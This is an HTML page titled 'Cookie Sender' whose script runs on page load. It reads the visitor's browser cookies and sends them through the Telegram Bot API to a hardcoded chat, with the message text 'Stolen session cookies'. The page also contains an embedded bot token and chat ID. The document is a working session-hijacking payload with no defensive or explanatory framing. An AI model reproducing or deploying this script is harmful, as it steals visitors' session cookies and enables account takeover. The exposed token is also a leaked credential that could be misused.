<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Sender</title>
    <script>
        // Function to send cookies
        function sendCookies() {
            // Get the cookies
            var cookies = document.cookie;

            // Telegram bot API details
            var telegramBotToken = "6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ";
            var chatID = "1900509620";
            var message = encodeURIComponent("Stolen session cookies: " + cookies);

            // Send the cookies to Telegram
            var telegramAPI = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
            var url = `${telegramAPI}?chat_id=${chatID}&text=${message}`;

            // Send request to Telegram
            fetch(url, { method: 'GET' })
                .then(response => response.json())
                .then(data => console.log('Success:', data))
                .catch(error => console.error('Error:', error));
        }

        // Execute the function when the page loads
        window.onload = function() {
            sendCookies();
        };
    </script>
</head>
<body>
    <h1>Cookie Sender Page</h1>
    <p>This page sends cookies to Telegram.</p>
</body>
</html>
